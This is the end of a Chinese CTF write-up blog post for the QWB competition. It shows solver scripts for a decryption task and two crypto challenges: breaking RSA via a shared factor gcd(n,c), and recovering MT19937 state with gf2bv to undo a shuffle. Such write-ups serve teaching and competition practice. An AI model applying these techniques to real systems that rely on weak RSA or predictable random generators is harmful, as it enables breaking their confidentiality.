</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">t_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">K</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># keep last 4 bytes unchanged</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;cipher too short&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">keep</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">to_decrypt</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pt</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">to_decrypt</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span> <span class="o">=</span> <span class="n">to_decrypt</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec</span> <span class="o">=</span> <span class="n">decrypt_block</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">K</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># for final partial block, keep only original length</span>
</span></span><span class="line"><span class="cl">    <span class="n">pt</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">dec</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">block</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># final plaintext = decrypted_part + kept_footer</span>
</span></span><span class="line"><span class="cl"><span class="n">final</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span> <span class="o">+</span> <span class="n">keep</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decrypted (hex):&#34;</span><span class="p">,</span> <span class="n">final</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decrypted (utf-8, errors=replace):&#34;</span><span class="p">,</span> <span class="n">final</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>输出得到:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">Decrypted (hex): 666c61677b6275747465725f666c795f6d6d785f656e636f64655f373737383136377d0a
</span></span><span class="line"><span class="cl">Decrypted (utf-8, errors=replace): flag{butter_fly_mmx_encode_7778167}
</span></span></code></pre></td></tr></table>
</div>
</div><p>flag 的值为: flag{butter_fly_mmx_encode_7778167}</p>
<h1 id="crypto">Crypto</h1>
<h2 id="check-little">check-little</h2>
<p>RSA，给出的$e=3$，很小，但是直接对$c$直接开三次方根又不行，用工具分解$n$也不行，不过既然存在$\varphi(n)$不能被$$$$整除这一层条件，那么这道题的解法绝对是分解$n$，后面实在没辙了拿$n$跟给出来的参数一个个求 gcd，发现$\gcd(n,c)$居然不为$1$或者$n$，也就是说$gcd(n,c)$就是$n$的一个质因数，那么这样就可以分解$n$了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">iroot</span><span class="p">,</span> <span class="n">gcd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x91\x16\x04\xb9\xf0</span><span class="s1">RJ</span><span class="se">\xdd\xf7</span><span class="s1">}</span><span class="se">\x8c</span><span class="s1">W</span><span class="se">\xe7</span><span class="s1">n</span><span class="se">\x81\x8d</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ct</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;bf87027bc63e69d3096365703a6d47b559e0364b1605092b6473ecde6babeff2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="n">N</span> <span class="o">//</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ct</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>从flag也能看出$ke$能被$p$整除，很新奇的出题思路.</p>
<h2 id="ezran">ezran</h2>
<p>很明显是基于2024年同济大学第二届网络安全新生赛CatCTF的Random game这道题改的，shuffle部分直接按照原题的方法打就行了，但是在此之前我们要先恢复MT19937的状态，对比两题源码可以看到本题将：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="nb">pow</span><span class="p">(</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="mi">17</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">^</span> <span class="n">getrandbits</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>改成了：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">r1</span> <span class="o">=</span> <span class="n">getrandbits</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r2</span> <span class="o">=</span> <span class="n">getrandbits</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="mi">257</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">^</span> <span class="n">r2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>并且只给了3108组这样的数据，就算我们只取所有$x$的高8位（也就是$r_2$的高8位）也是完全足以恢复 MT19937 的状态的（$8\times 3108=24864&gt;1993$），但是直接改<a href="https://tangcuxiaojikuai.xyz/post/69eaef2e.html#more">原脚本</a>跑要么就是Killed了，要么就是跑到半路卡死了，估计是电脑不太行，搞了半天想起来 maple 大佬写的那个 gf2bv，尝试依据原题的思路再加上 gf2bv 原来项目给出的例子改写了一下代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gf2bv</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gf2bv.crypto.mt</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">set_int_max_str_digits</span><span class="p">(</span><span class="mi">114514</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gift</span> <span class="o">=</span> <span class="s2">&#34;...&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">gift</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gift</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="s2">&#34;)9Lsu_4s_eb__otEli_nhe_tes5gii5sT@omamkn__ari{efm0__rmu_nt(0Eu3_En_og5rfoh}nkeoToy_bthguuEh7___u&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">giftstr</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">gift</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="p">[</span><span class="n">giftstr</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">giftstr</span><span class="p">),</span> <span class="mi">2</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LS</span> <span class="o">=</span> <span class="n">LinearSystem</span><span class="p">([</span><span class="mi">32</span><span class="p">]</span> <span class="o">*</span> <span class="mi">624</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">mt</span> <span class="o">=</span> <span class="n">LS</span><span class="o">.</span><span class="n">gens</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">RNG</span> <span class="o">=</span> <span class="n">MT19937</span><span class="p">(</span><span class="n">mt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">r1</span> <span class="o">=</span> <span class="n">RNG</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r2</span> <span class="o">=</span> <span class="n">RNG</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">64</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>  <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">tmp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r2</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">tmp</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">r2</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">r2</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mt</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x80000000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sol</span> <span class="o">=</span> <span class="n">LS</span><span class="o">.</span><span class="n">solve_all</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># print(sol)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">solve</span> <span class="ow">in</span> <span class="n">sol</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">mt19937</span> <span class="o">=</span> <span class="n">MT19937</span><span class="p">(</span><span class="n">solve</span><span class="p">)</span><span class="o">.</span><span class="n">to_python_random</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">3108</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">r1</span> <span class="o">=</span> <span class="n">mt19937</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r2</span> <span class="o">=</span> <span class="n">mt19937</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">assert</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="mi">257</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">^</span> <span class="n">r2</span> <span class="o">==</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">))]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2025</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">mt19937</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span><span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span></code></pre></td></tr></table>
</div>
</div>

        
          <div class="blog-tags">
            
              
              <a href="http://localhost:1313/tags/qwb/">QWB</a>&nbsp;
            
          </div>
        

        

        
          
            
          

          
                  <h4 class="see-also">See also</h4>
                  <ul>
                
                
                    <li><a href="/post/qwb-s4-su-wu/">强网杯 S4 SU Write-Up</a></li>
                
              </ul>

          
        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="http://localhost:1313/post/wmctf-2025-su-wu/" data-toggle="tooltip" data-placement="top" title="2025 WMCTF SU WriteUp">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="http://localhost:1313/post/ntfy-2025-su-wu/" data-toggle="tooltip" data-placement="top" title="第八届“强网”拟态防御国际精英挑战赛 SU Writeup">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
                
		  <a href="https://ctftime.org/team/29641" title="CTFTime">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    
                      <img src="http://localhost:1313/img/ctftime.svg" title="CTFTime" alt="CTFTime" style="width:60%;height:60%;position:absolute;top:20%;left:20%">
                    
                  </span>
                </a>
              </li>
              <li>
                
		  <a href="mailto:suers_xctf@126.com" title="Email me">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    
                      <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
                    
                  </span>
                </a>
              </li>
              <li>
                
		  <a href="https://github.com/team-su" title="GitHub">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    
                      <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                    
                  </span>
                </a>
              </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              <a href="https://su-team.cn">SUer</a>
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2026
          

          
            &nbsp;&bull;&nbsp;
            <a href="http://localhost:1313/">su-team</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="http://localhost:1313/js/katex.min.js"></script>
<script defer src="http://localhost:1313/js/auto-render.min.js"></script>
<script src="http://localhost:1313/js/jquery-3.7.0.slim.min.js"></script>
<script src="http://localhost:1313/js/bootstrap.min.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function() {
    renderMathInElement(document.body, {
      delimiters: [
        { left: "$$", right: "$$", display: true },
        { left: "$", right: "$", display: false },
        { left: "\\begin{equation}", right: "\\end{equation}", display: true },
        { left: "\\begin{align}", right: "\\end{align}", display: true },
        { left: "\\begin{alignat}", right: "\\end{alignat}", display: true },
        { left: "\\begin{gather}", right: "\\end{gather}", display: true },
        { left: "\\(", right: "\\)", display: false },
        { left: "\\[", right: "\\]", display: true }
      ]
    });
  });
</script>

<script src="http://localhost:1313/js/main.js"></script><script src="http://localhost:1313/js/photoswipe.min.js"></script>
<script src="http://localhost:1313/js/photoswipe-ui-default.min.js"></script><script src="http://localhost:1313/js/load-photoswipe.js"></script>










    
  </body>
</html>

